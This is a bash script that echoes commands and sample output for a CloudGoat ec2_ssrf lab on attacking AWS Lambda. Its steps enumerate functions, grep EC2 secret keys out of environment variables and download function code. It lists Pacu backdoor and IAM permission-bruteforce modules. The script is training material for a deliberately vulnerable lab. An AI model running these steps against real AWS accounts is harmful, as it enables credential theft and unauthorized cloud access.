#!/bin/bash


# ------------- attacking AWS Lambda functions

echo "------------------------------[ AWS Lambda functions ]"
# https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ec2_ssrf/README.md
echo "cloudgoat create ec2_ssrf"

# mkdir cloudgoat; cd cloudgoat; mkdir ec2_ssrf;

echo "cloudgoat_output_solus_access_key_id = AKI2WWGV56KSLMAXCAW"
echo "cloudgoat_output_solus_secret_key_id = jSopcQuD6NDFUMNYtx4c4H87NO87iwjgAAYtBu"
echo ""


# ----------- method 1: using the website 

# AWS Lambda Console    <region>.2.console.aws.amazon.com/lambda/home?/region=<region>

#       if in wrong region      page shows 'Get Started create a function'
#       if in correct region    page shows 'Your Functions  Lambda function(s)   1' 

#  click on Manage functions 
#  click on function > look at code source > download (.zip) 
#  click on Configuration
#  click on Environment Variables
# ----------- 


# ----------- method 2

echo "------ AWS CLI"
echo ""
read -p "Enter profile name: " profile_name
echo ""
echo "aws configure --profile $profile_name" | lolcat
read -p "AWS Access Key ID: " access_key
read -p "AWS Secret Access Key: " secret_key
read -p "Default region name: " region
read -p "Default output format: " format
echo ""
echo ""

# whoami
echo "aws sts get-caller-identity --profile $profile_name" | lolcat
cat ./files/ec2-solus.txt
echo ""
echo ""


# what functions exist
echo "aws lambda list-functions --region $region --profile $profile_name" | lolcat

cat ./files/list-functions.json | grep -i "FunctionName" | uniq
cat ./files/list-functions.json | grep -i "EC2_ACCESS_KEY_ID"
cat ./files/list-functions.json | grep -i "EC2_SECRET_KEY_ID"
echo ""
echo ""


# download the source code
read -p "Enter lambda function name: " lambda     # daily-report-generator2
echo "aws lambda get-function --function-name $lambda --profile $profile_name" | lolcat
echo ""
echo ""
echo "Location": "https://pro0d-03-2014-tasks.s3.us-east1.amazonaws.com/snapshots/100/cg-lambda-cgidwiowiiwuz-2782aximsjhsiss828hs8w9whsyskaahahahahahkskskspowpw282?versionsId=iPAYjrR3sbssjUah-Amz-Security-Token=IQRW%2g2uaggPOssGG892"
echo ""
echo ""
# copy link and past in browser or cURL it




# ---------------- pacu
echo "------------[ pacu ]"
echo "pacu"
read -p "name of new sessions? " new_session
echo ""
echo "import_keys $new_session" | lolcat

echo "search lambda"
echo ""

echo "lambda__backdoor_new_roles"
echo "lambda__backdoor_new_sec_groups"
echo "lambda__backdoor_new_users"
echo "lambda__enum"
echo ""

echo "run lambda__enum --region $region" | lolcat
echo ""
cat ./files/ec2-vars.txt
echo ""
echo ""

# shows all the data including download link for source code
echo "data lambda" | lolcat
echo ""
echo ""












# ---------------------------------------------- attacking AWS lambda functions
echo "--------------------[ AWS lambda functions ]"
read -p "Enter profile name: " profile_name
echo ""
echo "aws configure --profile $profile_name"
read -p "AWS Access Key ID: " access_key
read -p "AWS Secret Access Key: " secret_key
read -p "Default region name: " region
read -p "Default output format: " format
echo ""
echo ""

echo "aws sts get-caller-identity --profile $profile_name"
echo ""
echo ""


# check inline policies
read -p "Enter AWS username: " user_name
echo "aws iam list-user-policies --user-name $user_name --profile $profile_name"
echo ""
echo ""

# list groups
echo "aws iam list-groups --profile $profile_name"
echo ""
echo ""

echo "aws iam list-attached-user-policies --user-name $user_name --profile $profile_name"
echo ""
echo ""


echo "-------------------------- pacu "
echo "new session: lambda"
echo "import_keys lambda"
echo "search iam"
echo ""
echo "iam__bruteforce_permissions"
echo "iam__decode_accesskey_id"
echo "iam__detect_honeytokens"
echo "iam__enum_action_query"
echo "iam__enum_permissions"
echo "iam__enum_users_roles_policies_groups"
echo "iam__get_credential_report"
echo "iam__enum_roles"
echo "iam__enum_users"
echo ""
echo ""

echo "run iam__enum_permissions"
echo ""
echo "run iam__bruteforce_permissions --region $region"
echo ""
sleep 3

echo "[ERROR] Remove codedeploy.get_deployment_target action"
echo "[ERROR] Remove codedeploy.list_deployment_target action"
echo "[INFO] ec2.describe_vpc_classic_link_dns_support() worked!"
echo "[INFO] ec2.describe_bundle_tasks() worked!"
echo "[INFO] ec2.describe_vpn_gateways() worked!"
echo "[INFO] ec2.describe_client_cpn_endpoints() worked!"
echo "[INFO] ec2.describe_flow_logs() worked!"
echo "[INFO] ec2.describe_instances() worked!"
echo "[INFO] ec2.describe_security_groups() worked!"
echo "..."
echo ""
echo "Num of IAM permissions found 70"
echo ""
echo "whoami" # shows all of the permissions 
echo ""

# now destroy the cloud instance (stop server, stop running processes)
echo "cloudgoat destroy ec2_ssrf"
echo ""
echo "Destroy "ec2_ssrf_cgidjae0022ixm"? [y/n]: y"
echo ""

